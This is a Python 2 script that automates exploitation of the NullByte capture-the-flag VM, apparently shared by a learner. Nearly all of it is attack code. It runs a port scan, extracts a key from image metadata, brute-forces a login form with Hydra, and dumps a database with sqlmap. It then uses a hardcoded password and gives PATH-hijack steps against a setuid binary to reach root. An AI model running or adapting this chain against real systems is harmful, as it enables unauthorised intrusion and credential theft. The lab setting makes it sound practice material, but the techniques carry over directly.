#!/usr/bin/env python
import sys
import socket
import getopt
import threading
import subprocess
import os
import paramiko

target = ""
wordlist = "/usr/share/wordlists/rockyou.txt"

def usage():
    print "Nullbyte Aut0pwn"
    print
    print "Usage: nullbyte.py -t target"
    print
    print "This script automates the pwning of Nullbyte created by lyon."
    print "-w --wordlist            - specify another wordlist other than /usr/share/wordlists/robots.txt [default from Kali]"
    sys.exit(0)

def pwn(target):
    portscan()
    key = exif()
    hydra(key)
    sqlmap(key)
    password = crack()
    ssh(password)

def portscan():
    global target
    print "################################"
    print "Phase 1: Quick portscan!"
    print "################################\n"
    ports = [80,111,777]
    print "..."
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((str(target), port))
            print "[+]%d/tcp open" % port
            s.close()
        except KeyboardInterrupt:
            print "Ctrl+C...goodbye!"
            sys.exit()
        except socket.error:
            print "Couldn't connect to server"
            sys.exit()
        except:
            print '[i]%d/tcp closed' % port
            s.close()

def exif():
    global target
    print "################################"
    print "\n\nPhase 2: Let's grab the image key"
    print "################################\n"
    print "Curling the site"
    c = "curl http://%s/" % target
    os.system(c)
    print "Just the main.gif...lets grab that"
    if not (os.path.isfile(os.getcwd() + "/main.gif")):
       os.system("wget http://%s/main.gif" % target)
    print "Downloading ExifTool to Extract metadata using exifool. Will be removed afterwards :)"
    if os.path.isdir(os.getcwd() + "/Image-ExifTool-10.07"):
        ec = "cd Image-ExifTool-10.07 && ./exiftool ../main.gif"
    else:
        ec = "wget http://www.sno.phy.queensu.ca/~phil/exiftool/Image-ExifTool-10.07.tar.gz && tar -xvf Image-ExifTool-10.07.tar.gz  && cd Image-ExifTool-10.07 && ./exiftool ../main.gif"
    output = os.popen(ec).read()
    output_array = output.split('\n')
    for item in output_array:
        if "Comment" in item:
            comment = item
            print "Key Found!!"
            comment = comment[-10:]
            return comment 
            
def hydra(key):
    global target
    global wordlist
    print "################################"
    print "Running Hydra to crack password...given it's easy :)"
    print "################################\n"
    c = "hydra %s http-form-post '/%s/index.php:key=^PASS^:invalid key' -P %s -la | tee hydra_output.txt" % (target, key, wordlist)
    print "Running command: \n " + c
    os.system(c)
    file = open('hydra_output.txt', "r")
    for line in file:
        if '[80]' in line:
            print "Password Found!"
            print line
        
def sqlmap(key):
    global target
    print "################################"
    print "Sqlmap Now! Let's grab that hash! This part may be a bit interactive"
    print "################################\n"
    c = "sqlmap -u 'http://%s/%s/420search.php?usrtosearch=x' --dbms mysql --tables -D seth --dump" % (target,key)
    os.system(c)
    oc = "cp /root/.sqlmap/output/%s/dump/seth/users.csv ." % target
    os.system(oc)

def crack():
    #this part could use a bit of work
    c = "echo YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE= | base64 -d > ramses"
    os.system(c)
    #crack the password via this script but there are some issues with john - unknown cipher text issue - quick solution
    with open("ramses") as f:
        for line in f:
            x = line
    if x == 'c6d6bd7ebf806f43c76acc3681703b81':
        print "Good to know the password hasn't changed!"
        password = "omega"
        print "SSH Password: " + password
    else:
        print "Couldn't seem to find the password!"
        sys.exit(0)
    return password

def ssh(password):
    print "Now you've just got to attack SSH! This is the furthest I've gotten..more to come!"
    print "All you need to run the following commands to grab the proof.txt as noted in my blog"
    print "1. cp /bin/sh /tmp/ps"
    print "2. export PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
    print "3. /var/www/backup/procwatch"
    print "4. cat /root/proof.txt"
    print
    print "That's it! I know it's a work in progress so help is always appreciated as I'm learning!"
    '''
    global target
    print "Now let's attack SSH!"
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect('192.168.61.147', port=777, username="ramses", password=password)
    except paramiko.SSHException:
        print "Connection Failed!"
        quit()
    stdin, stdout, stderr = ssh.exec_command("cp /bin/sh /tmp/ps & export PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games && /var/www/backup/procwatch && cp /root/proof.txt > /home/ramses/proof.txt")
    for line in  stdout.readlines():
        print line
    ssh.close()
    '''

def main():
    global target
    global wordlist

    if not len(sys.argv[1:]):
        usage()

    try:
        opts,args = getopt.getopt(sys.argv[1:],"ht:w:",["help","target"])
    except getopt.GetoptError as err:
        print str(err)
        usage()

    found_t = False

    for o,a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-t", "--target"):
            target = a
            found_t = True
            pwn(target)
        elif not found_t:
            print "-t option not specified"
            usage()
            sys.exit(2)
        elif o in ("-w", "--wordlist"):
            wordlist = a
        else:
            assert False, "Unhandled Option"

main()
